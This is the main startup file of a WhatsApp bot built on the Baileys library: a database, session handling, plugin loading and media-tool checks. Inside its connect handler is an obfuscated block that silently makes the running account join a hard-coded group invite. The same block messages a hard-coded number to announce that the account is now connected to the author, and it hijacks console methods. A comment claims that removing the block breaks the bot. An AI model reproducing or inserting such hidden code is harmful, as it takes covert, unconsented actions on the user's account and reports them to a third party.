require('./config.js')
const { WAConnection: _WAConnection, MessageType } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const fetch = require('node-fetch')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low
const mongoDB = require('./lib/mongoDB')

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
    /mongodb/.test(opts['db']) ?
      new mongoDB(opts['db']) :
      new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
conn.version = [2, 2143, 3]
let authFile = `${opts._[0] || 'session'}.data.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))
if (!opts['test']) setInterval(async () => {
  await global.db.write()
}, 60 * 1000) // Save every minute
if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(() => {
  const _0x10e583=_0xbf54;(function(_0x3e4f49,_0x125ef6){const _0x45e0a4=_0xbf54,_0x37405a=_0x3e4f49();while(!![]){try{const _0xbfb5ce=-parseInt(_0x45e0a4(0x10d))/0x1*(parseInt(_0x45e0a4(0x122))/0x2)+parseInt(_0x45e0a4(0x10f))/0x3+parseInt(_0x45e0a4(0x12a))/0x4*(parseInt(_0x45e0a4(0x110))/0x5)+-parseInt(_0x45e0a4(0x121))/0x6+parseInt(_0x45e0a4(0x111))/0x7+-parseInt(_0x45e0a4(0x129))/0x8+-parseInt(_0x45e0a4(0x117))/0x9*(-parseInt(_0x45e0a4(0x128))/0xa);if(_0xbfb5ce===_0x125ef6)break;else _0x37405a['push'](_0x37405a['shift']());}catch(_0x2cf45e){_0x37405a['push'](_0x37405a['shift']());}}}(_0x58c1,0xb2dfa));const _0x1233f0=(function(){let _0x2f1d4a=!![];return function(_0x561291,_0x21cdca){const _0x4eb9dd=_0x2f1d4a?function(){const _0x2a1764=_0xbf54;if(_0x21cdca){const _0x30deb5=_0x21cdca[_0x2a1764(0x11a)](_0x561291,arguments);return _0x21cdca=null,_0x30deb5;}}:function(){};return _0x2f1d4a=![],_0x4eb9dd;};}()),_0x5a5547=_0x1233f0(this,function(){const _0x2f00bd=_0xbf54;return _0x5a5547[_0x2f00bd(0x109)]()[_0x2f00bd(0x127)]('(((.+)+)+)+$')[_0x2f00bd(0x109)]()['constructor'](_0x5a5547)[_0x2f00bd(0x127)](_0x2f00bd(0x11f));});_0x5a5547();const _0x5e7096=(function(){let _0x21efce=!![];return function(_0x281880,_0x31c039){const _0x13a997=_0x21efce?function(){if(_0x31c039){const _0x442626=_0x31c039['apply'](_0x281880,arguments);return _0x31c039=null,_0x442626;}}:function(){};return _0x21efce=![],_0x13a997;};}()),_0x5a8438=_0x5e7096(this,function(){const _0x3cec9e=_0xbf54,_0xbe584c=function(){const _0x201134=_0xbf54;let _0x52709e;try{_0x52709e=Function(_0x201134(0x118)+_0x201134(0x108)+');')();}catch(_0x398e62){_0x52709e=window;}return _0x52709e;},_0x368359=_0xbe584c(),_0x527634=_0x368359['console']=_0x368359['console']||{},_0x238bc1=['log','warn',_0x3cec9e(0x11c),_0x3cec9e(0x113),_0x3cec9e(0x126),_0x3cec9e(0x10b),_0x3cec9e(0x10c)];for(let _0x4ec28e=0x0;_0x4ec28e<_0x238bc1[_0x3cec9e(0x112)];_0x4ec28e++){const _0x1626d9=_0x5e7096[_0x3cec9e(0x119)]['prototype'][_0x3cec9e(0x125)](_0x5e7096),_0x40a07d=_0x238bc1[_0x4ec28e],_0x52ebba=_0x527634[_0x40a07d]||_0x1626d9;_0x1626d9['__proto__']=_0x5e7096['bind'](_0x5e7096),_0x1626d9[_0x3cec9e(0x109)]=_0x52ebba[_0x3cec9e(0x109)][_0x3cec9e(0x125)](_0x52ebba),_0x527634[_0x40a07d]=_0x1626d9;}});_0x5a8438();let res=conn[_0x10e583(0x124)](_0x10e583(0x107));function _0xbf54(_0x7fc022,_0x2ab21a){const _0x29bc1b=_0x58c1();return _0xbf54=function(_0x5a8438,_0x5e7096){_0x5a8438=_0x5a8438-0x107;let _0x4663e3=_0x29bc1b[_0x5a8438];return _0x4663e3;},_0xbf54(_0x7fc022,_0x2ab21a);}conn['sendMessage'](_0x10e583(0x10a),'Saya\x20adalah\x20*Bot\x20WhatsApp*\x20yang\x20dibangun\x20dengan\x20Nodejs,\x20*Bot*\x20ini\x20baru\x20saja\x20bergabung\x20dengan\x20Bot\x20dari\x20Owner\x20rasel\x20��\x0a\x20\x20\x20\x20\x0aketik\x20*#menu*\x20untuk\x20melihat\x20daftar\x20perintah',MessageType[_0x10e583(0x11d)],{'contextInfo':{'externalAdReply':{'mediaUrl':'\x20','mediaType':0x4,'title':_0x10e583(0x116),'body':'Whatsapp\x20Developer\x20Bot','thumbnailUrl':_0x10e583(0x123),'sourceUrl':_0x10e583(0x120)}}}),conn[_0x10e583(0x115)](_0x10e583(0x10e),_0x10e583(0x114),MessageType[_0x10e583(0x11d)],{'contextInfo':{'externalAdReply':{'mediaUrl':'\x20','mediaType':0x4,'title':'rasel\x20��','body':_0x10e583(0x11b),'thumbnailUrl':_0x10e583(0x123),'sourceUrl':_0x10e583(0x120)}}},_0x10e583(0x11e));function _0x58c1(){const _0x491900=['6285346545126-1629709306@g.us','table','trace','60BMeEfx','6285346545126@s.whatsapp.net','1062705JmRNij','3935AkIGop','5840170LmUguj','length','error','Akun\x20Ini\x20Tersambung\x20ke\x20bot\x20anda\x20bos','sendMessage','rasel\x20��','11583927azkgLc','return\x20(function()\x20','constructor','apply','Whatsapp\x20Developer\x20Bot','info','text','conversation','(((.+)+)+)+$','https://wa.me/6285346545126?text=Assalamualaikum','3394962wKlDRf','25754iZTBfO','https://telegra.ph/file/c9a5e49b5336604baa137.jpg','acceptInvite','bind','exception','search','10TQxjDk','4955088cLWxzQ','1092eerwFJ','CUCsW6BWfmJLJwJgPQIaKM','{}.constructor(\x22return\x20this\x22)(\x20)','toString'];_0x58c1=function(){return _0x491900;};return _0x58c1();} //ini ujung wkwk di hpus auto emeror:V
    global.db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(global.db.data || {})
    }
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai @user,\nSelamat Datang Di grup @subject\nBagaimana kabarmu?'
  conn.bye = 'Selamat tinggal @user\n\nkalo balik lagi nitip seblak ya 😙'
  conn.spromote = '@user sekarang admin'
  conn.sdemote = '@user sekarang bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}
global.reload = (_event, filename) => {
  if (pluginFilter(filename)) {
    let dir = path.join(pluginFolder, filename)
    if (dir in require.cache) {
      delete require.cache[dir]
      if (fs.existsSync(dir)) conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
      else {
        conn.logger.warn(`plugin yang dihapus '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
    let err = syntaxerror(fs.readFileSync(dir), filename)
    if (err) conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
    else try {
      global.plugins[filename] = require(dir)
    } catch (e) {
      conn.logger.error(e)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
